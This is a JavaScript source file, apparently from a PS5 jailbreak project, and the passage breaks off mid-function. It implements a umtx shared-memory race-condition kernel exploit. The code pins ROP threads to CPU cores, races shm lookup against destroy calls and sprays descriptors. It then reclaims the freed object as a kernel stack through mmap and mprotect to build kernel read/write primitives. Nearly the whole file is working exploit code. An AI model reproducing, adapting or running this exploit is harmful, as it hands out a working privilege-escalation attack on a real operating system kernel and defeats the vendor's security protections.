// @ts-check

/** 
 * @typedef {Object} KernelRW
 * 
 * @property {number} masterSock
 * @property {number} victimSock
 * 
 * @property {int64} kdataBase
 * @property {int64} ktextBase
 * 
 * @property {function(int64):Promise<number>} read1
 * @property {function(int64):Promise<number>} read2
 * @property {function(int64):Promise<number>} read4
 * @property {function(int64):Promise<int64>} read8
 * 
 * @property {function(int64, number):Promise<void>} write1
 * @property {function(int64, number):Promise<void>} write2
 * @property {function(int64, number):Promise<void>} write4
 * @property {function(int64, int64):Promise<void>} write8
 * 
 * @property {int64} curthrAddr
 * @property {int64} curprocAddr
 * @property {int64} procUcredAddr
 * @property {int64} procFdAddr
 * 
 * @property {int64} pipeMem
 * @property {int64} pipeAddr
 * 
 */


/**
 * @param {WebkitPrimitives} p 
 * @param {worker_rop} chain 
 * @param {function(string, LogLevel):Promise<void>} [log] 
 * @returns {Promise<KernelRW>}
 */
async function runUmtx2Exploit(p, chain, log = async () => { }) {
    const totalStartTime = performance.now();

    const debug = false;
    const doInvalidKstackMunmap = true;
    const doYieldAtDestroyWait = false;

    /**
     * @param {number} ms 
     * @returns {string}
     */
    function toHumanReadableTime(ms) {
        const seconds = ms / 1000;
        const minutes = seconds / 60;
        const hours = minutes / 60;

        let str = "";
        if (hours >= 1) {
            str += `${Math.floor(hours)}h `;
        }
        if (minutes >= 1) {
            str += `${Math.floor(minutes % 60)}m `;
        }
        if (seconds >= 1) {
            str += `${Math.floor(seconds % 60)}s `;
        }
        str += `${Math.floor(ms % 1000)}ms`;

        return str;
    }

    const config = {
        max_attempts: 100,
        max_race_attempts: 0x400,
        num_spray_fds: 0x28,
        num_kprim_threads: 0x180,
    };

    const thread_config = {
        main_thread: { core: 11, prio: 256 },
        destroyer_thread0: { core: 13, prio: 256 },
        destroyer_thread1: { core: 14, prio: 256 },
        lookup_thread: { core: 15, prio: 400 },
        reclaim_thread: { core: -1, prio: 450 }
    }

    const BUMP_ALLOCATOR_SIZE = 0x100000; // 1MB

    const MAP_PRIVATE = 0x2;
    const MAP_ANONYMOUS = 0x1000;
    const PROT_READ = 0x1;
    const PROT_WRITE = 0x2;

    const bumpAllocatorBuffer = await chain.syscall(SYS_MMAP, 0, BUMP_ALLOCATOR_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if ((bumpAllocatorBuffer.low << 0) == -1) {
        throw new Error("mmap failed");
    }
    let bumpAllocatorPos = 0;

    /**
     * @param {number} size 
     * @returns {int64}
     */
    function alloc(size) {
        if (bumpAllocatorPos + size > BUMP_ALLOCATOR_SIZE) {
            throw new Error("Bump allocator full");
        }

        const ptr = bumpAllocatorBuffer.add32(bumpAllocatorPos);
        bumpAllocatorPos += size;
        return ptr;
    }

    /**
     * 
     * @param {int64} mask_addr 
     * @returns {number}
     */
    function getCoreIndex(mask_addr) {
        let num = p.read4(mask_addr);
        let position = 0;
        while (num > 0) {
            num = num >>> 1;
            position = position + 1;
        }
        return position - 1;
    }

    const minusOneInt32 = 0xFFFFFFFF;
    const minusOneInt64 = new int64(0xFFFFFFFF, 0xFFFFFFFF);

    /**
     * @returns {Promise<number>}
     */
    async function getCurrentCore() {
        const level = 3;
        const which = 1;
        const id = minusOneInt64;
        const setsize = 0x10;
        const mask = alloc(0x10);
        const res = await chain.syscall_int32(SYS_PS4_CPUSET_GETAFFINITY, level, which, id, setsize, mask);
        if (res != 0) {
            throw new Error("get_current_core failed");
        }

        return getCoreIndex(mask);
    }

    const RTP_LOOKUP = 0;
    const RTP_SET = 1;

    // const PRI_ITHD = 1;      /* Interrupt thread. */
    const PRI_REALTIME = 2;	 /* Real time process. */
    const PRI_TIMESHARE = 3; /* Time sharing process. */
    const PRI_IDLE = 4;      /* Idle process. */
    /**
     * @param {number} type 
     * @param {number} [prio] 
     * @param {number} [prio_type] 
     */
    async function rtprio(type, prio = 0, prio_type = PRI_REALTIME) {
        const rtprio = alloc(0x4);
        p.write2(rtprio, prio_type);
        p.write2(rtprio.add32(0x2), prio);

        const res = await chain.syscall_int32(SYS_RTPRIO_THREAD, type, 0, rtprio);
        if (res != 0) {
            throw new Error("rtprio failed");
        }

        if (type == RTP_LOOKUP) {
            return p.read4(rtprio.add32(0x2)) << 0;
        }

        return 0;
    }

    /**
     * @param {number} prio 
     * @param {number} prio_type 
     */
    async function setRtprio(prio, prio_type = PRI_REALTIME) {
        return await rtprio(RTP_SET, prio, prio_type);
    }

    /**
     * @returns {Promise<number>}
     */
    async function getRtprio() {
        return await rtprio(RTP_LOOKUP);
    }

    /**
     * @param {rop} thread 
     * @param {number} prio 
     */
    function threadSetRtPrio(thread, prio) {
        const rtprio = alloc(0x4);
        p.write2(rtprio, PRI_REALTIME);
        p.write2(rtprio.add32(0x2), prio);

        thread.self_healing_syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
    }


    /**
     * @param {number} core 
     */
    async function pinToCore(core) {
        const level = 3;
        const which = 1;
        const id = minusOneInt64;
        const setsize = 0x10;
        const mask = alloc(0x10);
        p.write2(mask, 1 << core);

        return await chain.syscall_int32(SYS_PS4_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }

    /**
     * @param {rop} thread 
     * @param {number} core 
     */
    function threadPinToCore(thread, core) {
        const level = 3;
        const which = 1;
        const id = minusOneInt64;
        const setsize = 0x10;
        const mask = alloc(0x10);
        p.write2(mask, 1 << core);

        thread.self_healing_syscall(SYS_PS4_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }


    /**
     * @param {thread_rop} thread 
     * @param {int64} addr 
     * @param {number} branch_type 
     * @param {int64|number} compare_value 
     */
    function threadWaitWhile(thread, addr, branch_type, compare_value, dereference_compare_value = false, yield = true) {
        thread.while(addr, branch_type, compare_value, dereference_compare_value, () => {
            if (yield) {
                thread.self_healing_syscall(SYS_SCHED_YIELD);
            }
        });
    }





    // ----------------------------------------

    const PIPE_SIZE = 0x10000;
    const pipe_buf = alloc(PIPE_SIZE);

    const pipeSlowFds = alloc(0x8);
    const pipeSlowRes = await chain.syscall_int32(SYS_PIPE2, pipeSlowFds, 0);
    if (pipeSlowRes != 0) {
        throw new Error("pipe2 failed");
    }

    const pipeSlowReadFd = p.read4(pipeSlowFds);
    const pipeSlowWriteFd = p.read4(pipeSlowFds.add32(0x4));

    const UMTX_OP_SHM = 26; // 25 on BSD
    const UMTX_SHM_CREAT = 0x0001;
    const UMTX_SHM_LOOKUP = 0x0002;
    const UMTX_SHM_DESTROY = 0x0004;

    // Create a UMTX key area to use, these just have to be valid pointers
    const sprayFdsBuf = alloc((config.num_spray_fds * 2) * 0x8);
    const primaryShmKeyBuf = alloc(0x8);
    const secondaryShmKeyBuf = alloc(0x8);

    const commonThreadData = {
        exit: alloc(0x8),
        start: alloc(0x8),
        resume: alloc(0x8)
    };

    const threadStatus = {
        DEFAULT: 0,
        READY: 1,
        DONE: 2,
        EXITED: 3
    };

    const destroyerThread0Data = {
        status: alloc(0x4),
        cpu: alloc(0x8),
        counter: alloc(0x8),
        destroyCount: alloc(0x8),
        shmOpCount: alloc(0x8),

        resStore: alloc(0x8),
        ftruncateSize: alloc(0x8)
    };

    
    const destroyerThread1Data = {
        status: alloc(0x4),
        cpu: alloc(0x8),
        counter: alloc(0x8),
        destroyCount: alloc(0x8),
        shmOpCount: alloc(0x8),

        resStore: alloc(0x8),
        ftruncateSize: alloc(0x8)
    };

    const lookupThreadData = {
        status: alloc(0x4),
        cpu: alloc(0x8),
        fd: alloc(0x8)
    };
    const lookupThread = new thread_rop(p, chain, "rop_thread_lookup");

    function resetLookupThreadState() {
        p.write4(lookupThreadData.status, threadStatus.DEFAULT);
        p.write8(lookupThreadData.cpu, 0);
        p.write8(lookupThreadData.fd, minusOneInt64);
    }

    function resetLookupThreadRop() {
        resetLookupThreadState();

        lookupThread.clear();

        threadPinToCore(lookupThread, thread_config.lookup_thread.core);
        threadSetRtPrio(lookupThread, thread_config.lookup_thread.prio);
        lookupThread.fcall(p.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        lookupThread.write_result(lookupThreadData.cpu);

        lookupThread.while(commonThreadData.exit, lookupThread.branch_types.EQUAL, 0, false, () => {
            lookupThread.push_write4(lookupThreadData.status, threadStatus.READY);

            threadWaitWhile(lookupThread, commonThreadData.start, lookupThread.branch_types.EQUAL, 0, false, doYieldAtDestroyWait);

            lookupThread.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, primaryShmKeyBuf);
            lookupThread.write_result(lookupThreadData.fd);

            // https://github.com/PS5Dev/PS5-UMTX-Jailbreak/blob/2cf6778ebe89ff35255e1c228826d0d2155e9d2a/document/en/ps5/exploit.js#L705
            // HACK: sonys code is shit, so we need to account for the fact that ESRCH can be returned without setting error flag
            // if (fd == 3) { fd = -1; }
            lookupThread.if(lookupThreadData.fd, lookupThread.branch_types.EQUAL, 3, false, () => {
                lookupThread.push_write8(lookupThreadData.fd, minusOneInt64);
            });

            lookupThread.push_write4(lookupThreadData.status, threadStatus.DONE);
            threadWaitWhile(lookupThread, commonThreadData.resume, lookupThread.branch_types.EQUAL, 0);
        });

        lookupThread.push_write4(lookupThreadData.status, threadStatus.EXITED);
    }


    const destroyerThread0 = new thread_rop(p, chain, "rop_thread_destroyer0");
    function resetDestroyerThread0State() {
        p.write4(destroyerThread0Data.status, threadStatus.DEFAULT);
        p.write8(destroyerThread0Data.cpu, 0);
        p.write8(destroyerThread0Data.counter, 0);
        p.write4(destroyerThread0Data.destroyCount, 0);
        p.write4(destroyerThread0Data.shmOpCount, 0);
    }

    const destroyerThread1 = new thread_rop(p, chain, "rop_thread_destroyer1");
    function resetDestroyerThread1State() {
        p.write4(destroyerThread1Data.status, threadStatus.DEFAULT);
        p.write8(destroyerThread1Data.cpu, 0);
        p.write8(destroyerThread1Data.counter, 0);
        p.write4(destroyerThread1Data.destroyCount, 0);
        p.write4(destroyerThread1Data.shmOpCount, 0);
    }

    function resetDestroyerThread0Rop() {
        resetDestroyerThread0State();

        destroyerThread0.clear();

        threadPinToCore(destroyerThread0, thread_config.destroyer_thread0.core);
        threadSetRtPrio(destroyerThread0, thread_config.destroyer_thread0.prio);
        destroyerThread0.fcall(p.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        destroyerThread0.write_result(destroyerThread0Data.cpu);

        destroyerThread0.while(commonThreadData.exit, destroyerThread0.branch_types.EQUAL, 0, false, () => {
            destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.READY);

            threadWaitWhile(destroyerThread0, commonThreadData.start, destroyerThread0.branch_types.EQUAL, 0, false, doYieldAtDestroyWait);

            // do the destroy
            destroyerThread0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
            destroyerThread0.write_result(destroyerThread0Data.resStore);

            destroyerThread0.if(destroyerThread0Data.resStore, destroyerThread0.branch_types.EQUAL, 0, false, () => {
                destroyerThread0.increment_dword(destroyerThread0Data.destroyCount);
            });

            destroyerThread0.increment_dword(destroyerThread0Data.shmOpCount);

            // wait for lookup thread
            // while (lookupThreadData.status < DONE) { sched_yield(); }
            threadWaitWhile(destroyerThread0, lookupThreadData.status, destroyerThread0.branch_types.LESSER, threadStatus.DONE);

            // wait for destroyer 1
            // while (destroyerThread1Data.shmOpCount == 0) { sched_yield(); }
            threadWaitWhile(destroyerThread0, destroyerThread1Data.shmOpCount, destroyerThread0.branch_types.EQUAL, 0);

            destroyerThread0.if(destroyerThread0Data.destroyCount, destroyerThread0.branch_types.EQUAL, 1, false, () => {
                destroyerThread0.if(destroyerThread1Data.destroyCount, destroyerThread0.branch_types.EQUAL, 1, false, () => {
                    // if (lookupThreadData.fd > 0)
                    destroyerThread0.if(lookupThreadData.fd, destroyerThread0.branch_types.GREATER, 0, false, () => {
                        for (let i = 0; i < (config.num_spray_fds * 2); i += 2) {
                            const fdStoreAddr = sprayFdsBuf.add32(0x8 * i);

                            destroyerThread0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, secondaryShmKeyBuf);
                            destroyerThread0.write_result(fdStoreAddr);

                            // ftruncate(fd, fd * PAGE_SIZE)
                            destroyerThread0.multiply_by_0x4000(fdStoreAddr, destroyerThread0Data.ftruncateSize);
                            destroyerThread0.self_healing_syscall_2(SYS_FTRUNCATE, fdStoreAddr, true, destroyerThread0Data.ftruncateSize, true);

                            destroyerThread0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, secondaryShmKeyBuf);
                        }
                    });
                });
            });

            destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.DONE);

            threadWaitWhile(destroyerThread0, commonThreadData.resume, destroyerThread0.branch_types.EQUAL, 0);
        });

        destroyerThread0.push_write4(destroyerThread0Data.status, threadStatus.EXITED);
    };


    function resetdestroyerThread1Rop() {
        resetDestroyerThread1State();

        destroyerThread1.clear();

        threadPinToCore(destroyerThread1, thread_config.destroyer_thread1.core);
        threadSetRtPrio(destroyerThread1, thread_config.destroyer_thread1.prio);
        destroyerThread1.fcall(p.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        destroyerThread1.write_result(destroyerThread1Data.cpu);

        destroyerThread1.while(commonThreadData.exit, destroyerThread1.branch_types.EQUAL, 0, false, () => {
            destroyerThread1.push_write4(destroyerThread1Data.status, threadStatus.READY);

            threadWaitWhile(destroyerThread1, commonThreadData.start, destroyerThread1.branch_types.EQUAL, 0, false, doYieldAtDestroyWait);

            // do the destroy
            destroyerThread1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
            destroyerThread1.write_result(destroyerThread1Data.resStore);

            destroyerThread1.if(destroyerThread1Data.resStore, destroyerThread1.branch_types.EQUAL, 0, false, () => {
                destroyerThread1.increment_dword(destroyerThread1Data.destroyCount);
            });

            destroyerThread1.increment_dword(destroyerThread1Data.shmOpCount);

            // wait for lookup thread
            threadWaitWhile(destroyerThread1, lookupThreadData.status, destroyerThread1.branch_types.LESSER, threadStatus.DONE);

            // wait for destroyer 0
            threadWaitWhile(destroyerThread1, destroyerThread0Data.shmOpCount, destroyerThread1.branch_types.EQUAL, 0);

            destroyerThread1.if(destroyerThread1Data.destroyCount, destroyerThread1.branch_types.EQUAL, 1, false, () => {
                destroyerThread1.if(destroyerThread0Data.destroyCount, destroyerThread1.branch_types.EQUAL, 1, false, () => {
                    // if (lookupThreadData.fd > 0)
                    destroyerThread1.if(lookupThreadData.fd, destroyerThread1.branch_types.GREATER, 0, false, () => {
                        for (let i = 1; i < (config.num_spray_fds * 2); i += 2) {
                            const fdStoreAddr = sprayFdsBuf.add32(0x8 * i);

                            destroyerThread1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, secondaryShmKeyBuf);
                            destroyerThread1.write_result(fdStoreAddr);

                            // ftruncate(fd, fd * PAGE_SIZE)
                            destroyerThread1.multiply_by_0x4000(fdStoreAddr, destroyerThread1Data.ftruncateSize);
                            destroyerThread0.self_healing_syscall_2(SYS_FTRUNCATE, fdStoreAddr, true, destroyerThread1Data.ftruncateSize, true);


                            destroyerThread1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, secondaryShmKeyBuf);
                        }
                    });
                });
            });

            destroyerThread1.push_write4(destroyerThread1Data.status, threadStatus.DONE);

            threadWaitWhile(destroyerThread1, commonThreadData.resume, destroyerThread1.branch_types.EQUAL, 0);
        });

        destroyerThread1.push_write4(destroyerThread1Data.status, threadStatus.EXITED);
    };

    const kprimThreads = Array(config.num_kprim_threads);

    const kprimCommonData = {
        status: alloc(config.num_kprim_threads * 0x4),
        exit: alloc(0x8),
        thr_index: alloc(0x8),
        cmd: alloc(0x8),
        cmdCounter: alloc(0x8),
        readCounter: alloc(0x8),
        writeCounter: alloc(0x8)
    };

    const kstackKernelRwCmd = {
        NOP: 0,
        READ_QWORD: 1,
        WRITE_QWORD: 2,
        EXIT: 256,
    };

    async function waitForKprimThreadsState(states, minCount = config.num_kprim_threads) {
        if (!Array.isArray(states)) {
            states = [states];
        }

        while (true) {
            await new Promise((resolve) => setTimeout(resolve, 10));

            let matchedCount = 0;
            for (let i = 0; i < config.num_kprim_threads; i++) {
                const currentState = p.read4(kprimCommonData.status.add32(i * 0x4));
                if (states.includes(currentState)) {
                    matchedCount++;
                }
            }

            if (matchedCount >= minCount) {
                break;
            }
        }
    }

    async function resetKprimThreadsState() {
        // ask to exit if they are running
        p.write8(kprimCommonData.thr_index, minusOneInt64);
        p.write8(kprimCommonData.exit, 1);

        await waitForKprimThreadsState([threadStatus.EXITED, threadStatus.DEFAULT]);

        p.write8(kprimCommonData.exit, 0);
        p.write8(kprimCommonData.cmd, 0);
        p.write8(kprimCommonData.cmdCounter, 0);
        p.write8(kprimCommonData.readCounter, 0);
        p.write8(kprimCommonData.writeCounter, 0);
    }

    async function resetKprimThreads() {
        await resetKprimThreadsState();

        const timeoutMs = 250;

        for (let i = 0; i < config.num_kprim_threads; i++) {
            const currentThreadStatusAddr = kprimCommonData.status.add32(i * 0x4);

            const ogStatus = p.read4(currentThreadStatusAddr);
            if (ogStatus != threadStatus.DEFAULT && ogStatus != threadStatus.EXITED) {
                throw new Error("kprim thread alive?");
            }

            p.write4(currentThreadStatusAddr, threadStatus.DEFAULT);

            if (!kprimThreads[i]) {
                kprimThreads[i] = new thread_rop(p, chain, `kprim_${i}`, 0x1000, 0x200);
                kprimThreads[i].customData = {
                    cookie: alloc(0x10),
                    timeval: alloc(0x10)
                };

                p.write8(kprimThreads[i].customData.timeval, 0);
                p.write8(kprimThreads[i].customData.timeval.add32(0x8), timeoutMs * 1000);
            }

            /** @type {thread_rop} */
            const thread = kprimThreads[i];

            // @ts-ignore
            const threadData = thread.customData;

            thread.clear();

            threadSetRtPrio(thread, thread_config.reclaim_thread.prio);

            thread.push_write4(currentThreadStatusAddr, threadStatus.READY);

            thread.while(kprimCommonData.exit, thread.branch_types.EQUAL, 0, false, () => {
                thread.push_write8(threadData.cookie, 0x13370000 + i);
                thread.self_healing_syscall(SYS_SELECT, 1, threadData.cookie, 0, 0, threadData.timeval);
                thread.self_healing_syscall(SYS_SCHED_YIELD);
            });

            thread.if(kprimCommonData.thr_index, thread.branch_types.EQUAL, i, false, () => {
                thread.while(kprimCommonData.cmd, thread.branch_types.LESSER, kstackKernelRwCmd.EXIT, false, () => {

                    // wait until it receives command
                    threadWaitWhile(thread, kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.NOP);

                    // read cmd
                    thread.if(kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.READ_QWORD, false, () => {
                        thread.increment_dword(kprimCommonData.readCounter);
                        thread.self_healing_syscall(SYS_WRITE, pipeSlowWriteFd, pipe_buf, 8);
                    });

                    // write cmd
                    thread.if(kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.WRITE_QWORD, false, () => {
                        thread.increment_dword(kprimCommonData.writeCounter);
                        thread.self_healing_syscall(SYS_READ, pipeSlowReadFd, pipe_buf, 8);
                    });

                    thread.increment_dword(kprimCommonData.cmdCounter);

                    thread.if_not(kprimCommonData.cmd, thread.branch_types.EQUAL, kstackKernelRwCmd.EXIT, false, () => {
                        // reset for next run
                        thread.push_write4(kprimCommonData.cmd, kstackKernelRwCmd.NOP);
                    });
                });
            });

            thread.push_write4(currentThreadStatusAddr, threadStatus.EXITED);
        }
    }

    async function waitForRaceThreadsState(state) {
        while (true) {
            await new Promise((resolve) => setTimeout(resolve, 1));

            const lookupThreadStatus = p.read4(lookupThreadData.status);
            if (lookupThreadStatus != state) {
                continue;
            }

            const destroyerThread0Status = p.read4(destroyerThread0Data.status);
            if (destroyerThread0Status != state) {
                continue;
            }

            const destroyerThread1Status = p.read4(destroyerThread1Data.status);
            if (destroyerThread1Status != state) {
                continue;
            }

            return;
        }
    }


    async function checkMemoryAccess(addr, checkSize = 1) {
        const pipesBuf = alloc(0x8);
        const pipesRes = await chain.syscall_int32(SYS_PIPE2, pipesBuf, 0);
        if (pipesRes != 0) {
            await log("pipe2 failed", LogLevel.ERROR);
            return false;
        }

        const readFd = p.read4(pipesBuf);
        const writeFd = p.read4(pipesBuf.add32(0x4));

        const checkBuf = alloc(checkSize);

        const actualWriteSize = await chain.syscall_int32(SYS_WRITE, writeFd, addr, checkSize);
        let result = actualWriteSize == checkSize;
        if (!result) {
            result = false;
        }

        if (result && actualWriteSize > 1) {
            const actualReadSize = await chain.syscall_int32(SYS_READ, readFd, checkBuf, checkSize);
            if (actualReadSize != actualWriteSize) {
                result = false;
            }
        }

        chain.add_syscall(SYS_CLOSE, readFd);
        chain.add_syscall(SYS_CLOSE, writeFd);

        await chain.run();

        return result;
    }


    /**
     * 
     * @param {int64} kstack 
     * @returns {number|null} - kprim id
     */
    function verifyKstack(kstack) {
        const cnt = 0x1000 / 8;

        for (let i = 0; i < cnt; i++) {
            const qword = p.read8(kstack.add32(0x3000 + (i * 8)));
            const num = qword.low << 0;
            if (num == 0) {
                continue;
            }

            if ((num >> 16) == 0x1337) {
                return num & 0xfff;
            }
        }

        return null;
    }


    const OFFSET_STAT_SIZE = 0x48;
    const getFdSizeTempBuffer = alloc(0x100);
    async function getFdSize(fd) {
        const res = await chain.syscall_int32(SYS_FSTAT, fd, getFdSizeTempBuffer);
        if (res == -1) {
            return null;
        }

        return p.read4(getFdSizeTempBuffer.add32(OFFSET_STAT_SIZE));
    }

    async function getShmFdFromSize(lookupFd) {
        if (lookupFd == -1) {
            return null;
        }

        let sizeFd = await getFdSize(lookupFd);
        if (!sizeFd) {
            return null;
        }

        sizeFd /= 0x4000;
        if (sizeFd <= 0x6 || sizeFd >= 0x400 || sizeFd == lookupFd) {
            return null;
        }

        return sizeFd;
    }


    let fdsToFix = [];
    let kstacksToFix = [];


    async function resetCommonData() {
        const lookupFd = p.read4(lookupThreadData.fd) << 0;

        if (lookupFd > 0 && !fdsToFix.includes(lookupFd)) {
            chain.add_syscall(SYS_CLOSE, lookupFd);
            p.write4(lookupThreadData.fd, -1);
        }

        chain.add_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, primaryShmKeyBuf);
        chain.add_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, secondaryShmKeyBuf);

        await chain.run();

        p.write8(commonThreadData.exit, 0);
        p.write8(commonThreadData.start, 0);
        p.write8(commonThreadData.resume, 0);
    }

    ///////////////////////////////////////////////////////////////////////
    // Start
    ///////////////////////////////////////////////////////////////////////


    const ogCore = await getCurrentCore();
    if (debug) await log(`Main thread original core: ${ogCore}`, LogLevel.DEBUG);

    const ogPrio = await getRtprio();
    if (debug) await log(`Main thread original prio: ${ogPrio}`, LogLevel.DEBUG);

    await pinToCore(thread_config.main_thread.core);
    await setRtprio(thread_config.main_thread.prio);
    if (debug) await log("Set main thread core and prio", LogLevel.DEBUG);

    let winnerFd = null;
    let winnerLookupFd = null;
    let kstack = null;

    let checkMemoryAccessFailCount = 0;

    await log("Triggering race...", LogLevel.LOG);

    for (let i = 1; i <= config.max_attempts; i++) {
        // await log(`Attempt ${i}`, LogLevel.LOG);

        resetLookupThreadRop();
        resetDestroyerThread0Rop();
        resetdestroyerThread1Rop();

        p.write8(commonThreadData.exit, 0);
        p.write8(commonThreadData.start, 0);
        p.write8(commonThreadData.resume, 0);

        winnerFd = null;
        winnerLookupFd = null;
        kstack = null;

        // Start threads - we made sure previous ones exited at the end of this loop
        await lookupThread.spawn_thread();
        await destroyerThread0.spawn_thread();
        await destroyerThread1.spawn_thread();
        if (debug) await log("Spawned threads, waiting for them to be ready...", LogLevel.DEBUG);

        await waitForRaceThreadsState(threadStatus.READY);
        if (debug) await log("All threads ready", LogLevel.DEBUG);

        let count = 0;

        const mainFdBuf = alloc(0x8);
        const mainFdSizeBuf = alloc(0x8);

        const beforeRaceTime = performance.now();

        for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
            if (i2 % 10 == 0) {
                if (debug) {
                    await log(`Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                } else {
                    await log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                }
            }

            // umtx_shm_create
            chain.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, primaryShmKeyBuf);
            chain.write_result(mainFdBuf);

            chain.if(mainFdBuf, chain.branch_types.GREATER, 0, false, () => {
                chain.multiply_by_0x4000(mainFdBuf, mainFdSizeBuf);
                chain.self_healing_syscall_2(SYS_FTRUNCATE, mainFdBuf, true, mainFdSizeBuf, true);
                chain.self_healing_syscall_2(SYS_CLOSE, mainFdBuf, true);
            });

            await chain.run();

            await waitForRaceThreadsState(threadStatus.READY);

            p.write8(commonThreadData.resume, 0);
            p.write8(commonThreadData.start, 1);

            await waitForRaceThreadsState(threadStatus.DONE);

            let destroyCount = p.read4(destroyerThread0Data.destroyCount) + p.read4(destroyerThread1Data.destroyCount);

            let lookupFd = p.read4(lookupThreadData.fd) << 0;

            if (destroyCount == 2) {
                const fd = await getShmFdFromSize(lookupFd);
                if (fd) {
                    winnerFd = fd;
                    winnerLookupFd = lookupFd;
                    await log(`overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
                }
            }

            // dont close lookup descriptor right away when it is possibly corrupted
            if (destroyCount == 2 && lookupFd != 3 && lookupFd != -1) {
                fdsToFix.push(lookupFd);
            }

            // close other fds
            for (let i3 = 0; i3 < (config.num_spray_fds * 2); i3++) {
                const addr = sprayFdsBuf.add32(0x8 * i3);
                const fd = p.read4(addr) << 0;
                if (fd > 0 && fd != winnerFd) {
                    chain.add_syscall(SYS_CLOSE, fd);
                }
                chain.push_write8(addr, 0);
            }
            await chain.run();

            // we have won the race
            if (winnerFd) {
                break;
            }

            await resetCommonData();
            resetLookupThreadState();
            resetDestroyerThread0State();
            resetDestroyerThread1State();

            if (i2 !== config.max_race_attempts - 1) {
                p.write8(commonThreadData.resume, 1);
            }

            count++;
        }

        if (count != config.max_race_attempts) {
            if (debug) await log(`Race won after ${count} attempts`, LogLevel.INFO);
        } else {
            if (debug) await log("Race max attempts reached, retrying...", LogLevel.INFO);
        }

        const afterRaceTime = performance.now();
        if (debug) await log(`Race took ${toHumanReadableTime(afterRaceTime - beforeRaceTime)}`, LogLevel.INFO);

        // signal all threads to exit
        p.write8(commonThreadData.exit, 1);
        p.write8(commonThreadData.resume, 1);

        if (debug) await log("Waiting for all threads to exit...", LogLevel.DEBUG);

        await waitForRaceThreadsState(threadStatus.EXITED);

        if (debug) await log("All threads exited", LogLevel.DEBUG);

        if (!winnerFd) {
            if (debug) await log("Loser", LogLevel.ERROR);
            continue;
        }

        // we have 2 fd referencing a shmfd which will be freed if we close 1 fd
        let closeRes = await chain.syscall_int32(SYS_CLOSE, winnerFd);
        if (closeRes != 0) {
            await log("Failed to close winnerFd", LogLevel.WARN);
            continue;
        }

        // map memory of freed shm object
        const PROT_NONE = 0x0;
        const MAP_SHARED = 0x1;

        // @ts-ignore
        kstack = await chain.syscall(SYS_MMAP, 0, 0x4000, PROT_NONE, MAP_SHARED, winnerLookupFd, 0);
        if ((kstack.low << 0) == -1) {
            await log("Failed to mmap kstack", LogLevel.WARN);
            continue;
        }

        await resetKprimThreads();

        for (let i = 0; i < config.num_kprim_threads; i++) {
            const thread = kprimThreads[i];
            thread.spawn_thread_chain();
        }

        if (debug) await log("Going to spawn kprim threads...", LogLevel.DEBUG);
        await chain.run();
        if (debug) await log("kprim threads spawned", LogLevel.DEBUG);

        // wait for kprim threads to be ready
        await waitForKprimThreadsState(threadStatus.READY);

        if (debug) await log(`All kprim threads ready ${config.num_kprim_threads}`, LogLevel.DEBUG);

        if (closeRes != 0 || (kstack.low << 0) == -1) {
            await log("Failed to reclaim kstack. Retrying...", LogLevel.WARN);
            if (doInvalidKstackMunmap) {
                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
            }
            kstack = null;
            continue;
        }

        kstacksToFix.push(kstack);

        if (debug) await log(`Managed to reclaim kstack with mmap. kstack = ${kstack.toString(16)}`, LogLevel.INFO);

        // change memory protections to r/w
        const PROT_READ = 0x1;
        const PROT_WRITE = 0x2;
        const mprotectRes = await chain.syscall_int32(SYS_MPROTECT, kstack, 0x4000, PROT_READ | PROT_WRITE);
        if (mprotectRes != 0) {
            await log("mprotect failed. Retrying...", LogLevel.WARN);
            if (doInvalidKstackMunmap) {
                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
            }
            kstack = null;
            continue;
        }

        if (debug) await log("Managed to modify kstack memory protection to r/w", LogLevel.INFO);

        // check if we have access to the page
        const checkRes = await checkMemoryAccess(kstack);
        if (!checkRes) {
            checkMemoryAccessFailCount++;
            await log("Failed to access kstack memory. Retrying...", LogLevel.WARN);
            if (doInvalidKstackMunmap) {
                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
            }
            kstack = null;
            await new Promise((resolve) => setTimeout(resolve, 100));
            continue;
        }

        await log("kstack can be accessed", LogLevel.SUCCESS);

        const kprimId = verifyKstack(kstack);
        if (kprimId == null) {
            await log("Failed to get kprim id from kstack. Retrying..", LogLevel.WARN);
            if (doInvalidKstackMunmap) {
                await chain.syscall(SYS_MUNMAP, kstack, 0x4000);
            }
            kstack = null;
            continue;
        }

        // ask all kprim threads to exit, except for thread that reclaims kstack
